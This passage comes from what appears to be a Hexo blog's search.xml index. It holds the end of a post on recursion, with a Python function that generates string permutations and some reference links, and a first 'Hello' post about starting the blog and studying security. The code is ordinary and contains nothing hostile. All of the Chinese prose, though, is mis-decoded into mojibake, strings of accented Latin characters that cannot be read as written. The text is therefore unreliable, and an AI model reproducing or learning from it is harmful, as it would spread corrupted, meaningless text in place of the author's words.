class="hljs-built_in">set</span>(result)<br></code></pre></td></tr></table></figure><p>è€Œå½“å­—ç¬¦ä¸²çš„é•¿åº¦å¤§äº2æ—¶ï¼Œåªéœ€è¦åœ¨ç¬¬äºŒä¸ªforå¾ªç¯å¤„å†æ¬¡è°ƒç”¨<code>permutations()</code>,ä½¿å¾—å…¶å¯¹å½“å‰å­—ç¬¦ä¸²é•¿åº¦å°ç§»ä½çš„å­—ç¬¦ä¸²è¿›è¡Œæ’åˆ—ç»„åˆï¼Œç„¶åè¿”å›ç»™ j ï¼Œå†ä¸<code>string[i]</code>è¿›è¡Œæ‹¼æ¥ï¼Œæ‰€ä»¥ç¨‹åºå¯ä»¥å†™æˆå¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">permutations</span>(<span class="hljs-params">string</span>):</span><br>    result = []<span class="hljs-comment"># å­˜æ”¾æ’åˆ—ç»„åˆçš„ç»“æœ</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(string)==<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">return</span> string<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(string)):<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> permutations(string[<span class="hljs-number">0</span>:i]+string[i+<span class="hljs-number">1</span>:]):<br>                result.append(string[i]+j)<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">set</span>(result)<br></code></pre></td></tr></table></figure><h3 id="End"><a href="#End" class="headerlink" title="End"></a>End</h3><p>æœ¬æ–‡å¯èƒ½ä¼šæœ‰å†™é”™çš„åœ°æ–¹ï¼Œè¯·è§è°…ï¼Œæˆ‘åªæ˜¯ä¸ªæ¡åƒåœ¾ï¼Œè¦æ˜¯æœ‰å¥½å¿ƒçš„å¤§å“¥æ„¿æ„æŒ‡å‡ºé”™è¯¯çš„åœ°æ–¹ï¼Œæˆ‘ä¼šå°½å¿«è¿›è¡Œä¿®æ”¹ï¼Œå…ˆæ„Ÿè°¢å¤§å“¥~</p><h3 id="å‚è€ƒï¼š"><a href="#å‚è€ƒï¼š" class="headerlink" title="å‚è€ƒï¼š"></a>å‚è€ƒï¼š</h3><blockquote><p><a href="https://zhuanlan.zhihu.com/p/94748605">https://zhuanlan.zhihu.com/p/94748605</a></p><p><a href="https://www.zhihu.com/question/24385418">https://www.zhihu.com/question/24385418</a></p><p><a href="https://blog.csdn.net/u011562123/article/details/81984470">https://blog.csdn.net/u011562123/article/details/81984470</a></p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>å­¦ä¹ é€’å½’çš„ä¸€äº›è®°å½•</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello</title>
    <link href="/2022/01/20/hello/"/>
    <url>/2022/01/20/hello/</url>
    
    <content type="html"><![CDATA[<p>æŒ‰ç…§æƒ¯ä¾‹ï¼Œåšå®¢ç¬¬ä¸€ç¯‡æ–‡ç« æ€»è¦è¯´è®²ä¸€äº›å¥‡å¥‡æ€ªæ€ªçš„è¯</p><p>å¾ˆæ—©ä¹‹å‰å°±æœ‰æ­å»ºåšå®¢çš„æƒ³æ³•ï¼Œä¹Ÿè¯•è¿‡ï¼Œä½†ä¸»è¦æ˜¯è‹¦äºæ²¡æœ‰ä»€ä¹ˆæ–‡ç« å¯å‘ï¼Œç°åœ¨æƒ³æƒ³å…¶å®æ˜¯å­¦åˆ°äº†ä»€ä¹ˆå°±å‘ä»€ä¹ˆï¼Œå†™çš„å¥½ä¸å¥½å…¶å®ä¹Ÿä¸æ˜¯é‚£ä¹ˆé‡è¦ï¼Œå½“ç„¶ï¼Œèƒ½å†™å¥½çš„åšå®¢æ˜¯æœ€å¥½çš„å•¦ã€‚è¿™æ¬¡æ­å»ºåšå®¢å¯èƒ½ä¹Ÿæ˜¯ä¸€æ—¶å…´èµ·ï¼Œä½†å¸Œæœ›æˆ‘ä»¥åèƒ½å¤ŸåšæŒä¸‹å»ï¼Œåœ¨æ­¤ä¹Ÿç«‹ä¸ª<code>flag</code> : <strong>æ¯å‘¨æ›´æ–°ä¸€ç¯‡åšå®¢</strong></p><p>æ­åšå®¢æ˜¯ç”¨çš„<code>github</code>+<code>hexo</code>ï¼Œä¸¤ä¸ªåŸå› ï¼Œä¸€ä¸ªæ²¡ç¥¨å­ï¼Œå¦ä¸€ä¸ªå›¾çœäº‹ï¼Œè¯´ç™½äº†å°±æ˜¯åˆæ‡’åˆæƒ³ç™½å«–(å¼€æºç²¾ç¥)</p><p>å­¦å®‰å…¨ä¹Ÿæ–­æ–­ç»­ç»­çš„å¾ˆé•¿æ—¶é—´äº†ï¼Œæ€»æ˜¯ç©ç€ç©ç€å­¦ä¸€ç‚¹ç‚¹çš„ï¼Œåˆ°å¤´æ¥ä¸€äº‹æ— æˆï¼Œæ‰¾ä¸ªå·¥ä½œéƒ½å¾ˆè´¹åŠ²ï¼Œå¦‚æœæœ‰äººçœ‹åˆ°äº†ï¼Œè¿˜è¯·æ¿€åŠ±è‡ªå·±è¦åšæŒä¸‹å»ï¼Œç©å¾ˆé‡è¦ï¼Œä½†å­¦ä¹ æ›´é‡è¦ã€‚å‡å¦‚å½“åˆå¥½å¥½å­¦ä¹ ï¼Œç°åœ¨ä¹Ÿä¸è‡³äºæ··åˆ°å»æ¡åƒåœ¾ï¼Œä½†æ˜¯æ²¡æœ‰å‡å¦‚ï¼Œæ²¡æœ‰å‡å¦‚ï¼æ²¡ä»€ä¹ˆæ˜¯èƒ½å¤Ÿä¸åŠ³è€Œè·çš„ï¼Œå½“ç„¶ï¼Œè¦æ˜¯ç‰¹æ®Šæƒ…å†µå¦ç®—ï¼Œå¯¹äºåƒæˆ‘è¿™æ ·çš„æ™®é€šäººæ¥è¯´ï¼Œæƒ³è¦è·å¾—ï¼Œå°±è¦ä»˜å‡ºï¼Œå¯èƒ½ä»˜å‡ºå¾ˆå¤šå´åªèƒ½æ”¶è·ä¸€ç‚¹ç‚¹ï¼Œä½†æ€»æ¯”æ²¡æœ‰å¼ºå“ˆã€‚è¯´å®è¯ï¼Œå®‰å…¨è¿™ä¸ªæˆ‘å¾ˆæ€•ä»¥åä¼šåƒä¸ä¸Šé¥­ï¼Œ30å²ä¹‹åå§ï¼Œæ‹…å¿ƒä¼šåƒä¸ä¸Šé¥­ã€‚æ¡åƒåœ¾çš„æˆ‘æŠ€æœ¯å¾ˆåƒåœ¾ï¼Œå£æ‰ä¹Ÿä¸è¡Œï¼Œä¸ºäººå¤„ä¸–ä¹Ÿä¸€èˆ¬èˆ¬ï¼Œæ„Ÿè§‰è‡ªå·±æ··ä¸æˆé¢†å¯¼ï¼Œæ‰€ä»¥å°±å¾ˆæ€•å¾ˆæ€•ã€‚å½“ç„¶åƒä¸ä¸Šé¥­å¯èƒ½æœ‰ç‚¹å¤¸å¼ ï¼Œä½†ç¡®å®æ˜¯æœ‰ä¸€å®šå¯èƒ½çš„ã€‚</p><p>å…¶å®æ­å»ºåšå®¢ä¹Ÿæœ‰å¥½å¤„ï¼Œç®€å•ç‚¹è¯´ï¼ŒæŠŠè‡ªå·±ç†è§£æˆ–è€…å­¦ä¹ çš„ä¸œè¥¿è¡¨è¾¾å‡ºæ¥ï¼Œè¿™åœ¨æˆ‘çœ‹æ¥æ˜¯æ¯”è‡ªå·±å­¦çš„æ›´éš¾ä¸€äº›ï¼Œä½†æ˜¯åœ¨å†™åšå®¢çš„è¿‡ç¨‹ä¸­ï¼Œä¼šå‘ç°è‡ªå·±ä»¥å‰ä¼¼æ‡‚éæ‡‚çš„åœ°æ–¹å¯èƒ½ä¼šé€æ¸æ¸…æ™°(è¿™ä¹Ÿæ˜¯æˆ‘è¿™å‡ å¤©åœ¨å†™ä¸‹ä¸€ç¯‡åšå®¢æ—¶çš„ä½“ä¼š)ã€‚</p><p>æ‰¯äº†ä¸€äº›åºŸè¯ï¼Œä¹Ÿèƒ½çœ‹ï¼Œä¹Ÿä¸èƒ½çœ‹ï¼Œæ°´ä¸€ä¸‹ï¼Œé¡ºé“æµ‹è¯•ä¸€ä¸‹åšå®¢èƒ½ä¸èƒ½ç”¨ï¼</p><p>å¦‚æœä½ çœ‹åˆ°äº†è¿™äº›åºŸè¯ï¼Œå¹¶ä¸”çœ‹çœ‹ä¹Ÿæ— å¦¨ï¼Œä½†è¯·åˆ«å–·æˆ‘ï¼Œè°¢è°¢å•¦~</p><p>æœ€åå†é™„å¼ å›¾ç‰‡å§ï¼Œä¹Ÿé™„ä¸Šä¸€å¥å°è¯</p><blockquote><p>åˆˆé™¤æ‚è‰ æ‰æœ‰æ–°ç”Ÿ</p></blockquote><p><img src="/2022/01/20/hello/hello.jfif"></p>]]></content>
    
    
    
    <tags>
      
      <tag>ä¸€äº›åºŸè¯å§</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
